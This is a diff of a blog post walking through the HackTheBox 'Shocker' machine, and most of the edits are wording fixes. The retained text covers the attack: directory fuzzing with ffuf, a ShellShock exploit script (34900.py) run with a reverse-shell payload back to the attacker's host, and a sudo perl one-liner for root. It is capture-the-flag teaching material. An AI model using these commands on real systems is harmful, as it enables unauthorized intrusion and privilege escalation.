@@ -13,7 +13,7 @@ As promised, here is the first of the HackTheBox write-ups that I am going to be
 
 ## Phase 1: Enumeration
 
-As with any boot2root, the first step is kicking off some external port scans to see whats up and kicking. I recently discovered [AutoRecon][autorecon] by Tib3ruis, and I have since made it a staple of my boot2root arsenal. It's great at automating all the low level stuff that you would be doing by hand, and it can usually find the low-hanging fruit pretty fast.
+As with any boot2root, the first step is kicking off some external port scans to see whats up and kicking. I recently discovered [AutoRecon][autorecon] by Tib3ruis, and I have since made it a staple of my boot2root arsenal. It's great at automating all the low-level stuff that you would be doing by hand, and it can usually find the low-hanging fruit pretty fast.
 
 ```bash
 autorecon -o shocker --single-target 10.10.10.56  
@@ -68,7 +68,7 @@ Nadha, worth a shot. Now that I know the SSH is secure, it's time to poke at the
 /server-status        (Status: 403) [Size: 299]
 ```
 
-Hmmm, not a lot there. I'm going to kick off another scan with a bigger wordlist just incase something was missed. This time I'm going to use `ffuf` because its speed is unrivaled and I am more familiar with its flags.
+Hmmm, not a lot there. I'm going to kick off another scan with a bigger wordlist just in case something was missed. This time I'm going to use `ffuf` because its speed is unrivaled and I am more familiar with its flags.
 
 ```bash
 ffuf -u http://10.10.10.56/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -of csv -o ./raft-large.csv
@@ -82,7 +82,7 @@ While that was running, I went to check the other `autorecon` scan output. This 
 ffuf -u http://10.10.10.56/FUZZ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -of csv -o ./raft-cgis-ext.csv -e .cgi,.php,.py,.sh
 ```
 
-What I should have done was to scan the "cgi-bin" directory using a wordlist like `raft-large-directories.txt` with the extensions I specified.
+What I should have done was to scan the "cgi-bin" directory using a wordlist like `raft-large-directories.txt` with the correct cgi extensions.
 
 **Right Command (That I Should Have Run)**
 
@@ -90,17 +90,17 @@ What I should have done was to scan the "cgi-bin" directory using a wordlist lik
 ffuf -u http://10.10.10.56/cgi-bin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -of csv -o ./raft-cgi-bin-ext.csv -e .cgi,.php,.py,.sh
 ```
 
-Nearly immediately we can see the new endpoint.
+That command will give us the vulnerable endpoint.
 
 ```
 user.sh                 [Status: 200, Size: 118, Words: 19, Lines: 8]
 ```
 
-This can stand as a valuable learning lesson for the future. Always, always, always properly enumerate directories - even if the root gives you a 403. Each directory should always be put through some directory enumeration tool, such as `ffuf`, so that better coverage can be achieved.
+This can stand as a valuable learning lesson for the future. Always, always, always properly enumerate directories - even if the root gives you a 403. Each directory should always be put through some directory enumeration tool, such as `ffuf`.
 
 ## Phase 2: Exploitation
 
-From here, I kind of cheated a little. I used some intuition by looking at the name of the Box and the location of *the only endpoint we found* and assumed that the box was vulnerable to ShellShock. So, I looked up some shellshock exploits using `searchsploit` and found a few candidates. There were `metasploit` modules for this exploit, but I didn't want to use `metasploit` so I looked for stand alone exploits.
+From here, I kind of cheated a little. I used some intuition by looking at the name of the Box and the location of *the only endpoint we found* and assumed that the box was vulnerable to ShellShock. So, I looked up some shellshock exploits using `searchsploit` and found a few candidates. There were `metasploit` modules for this exploit, but I didn't want to use `metasploit` so I looked for standalone exploits.
 
 ```bash
 $ searchsploit shellshock
@@ -108,13 +108,15 @@ $ searchsploit shellshock
 Apache mod_cgi - 'Shellshock' Remote Command Injection | linux/remote/34900.py
 ```
 
-Lets go ahead and pull that one down and inspect it.
+Let's go ahead and pull that one down and inspect it.
 
 ```bash
 ssp -m linux/remote/34900.py
 mv 34900.py shellshock.py
 less shellshock.py
 ```
+
+**linux/remote/34900.py**
 
 ```python
 #! /usr/bin/env python
@@ -158,7 +160,7 @@ Federico Galatolo 2014
 ...
 ```
 
-Okay, seems straightforward enough. Only one thing to do and thats give her a go.
+Okay, seems straightforward enough. It will handle creating the listener, so all thats left to do is run it.
 
 ```bash
 $ ./shellshock.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.10 lport=8000 pages=/cgi-bin/user.sh
@@ -198,7 +200,7 @@ Once I have a TTY, I followed [this guide][tty-shell] for getting a proper TTY s
 
 ## Phase 3: Privilege Escalation
 
-My go-to linux privilege escalation script is the fantastic [linpeas.sh][linpeas] by carlospolop. I used `wget` to get it onto our victim machine, then let it rip. Something immediately caught my eye while the output was scrolling past.
+My go-to linux privilege escalation script is the fantastic [linpeas.sh][linpeas] by carlospolop. I used `wget` to get it onto our victim machine, then let it run. Something immediately caught my eye while the output was scrolling past.
 
 ```
 [+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
@@ -210,7 +212,7 @@ User shelly may run the following commands on Shocker:
     (root) NOPASSWD: /usr/bin/perl
 ```
 
-Our user can run `perl` with `sudo`! I know that `perl` can be used to escalate privileges to root, so I went to check [GTFObins][gtfobins] to see how I could do that. Sure enough, [GTFObins] provided me with the following command.
+Our user can run `perl` with `sudo`! I know that `perl` can be used to escalate privileges to root, so I went to check [GTFObins][gtfobins] for an easy one-liner to do just that. Sure enough, [GTFObins] provided me with the following command.
 
 ```bash
 shelly@Shocker:/tmp$ sudo perl -e 'exec "/bin/bash"'
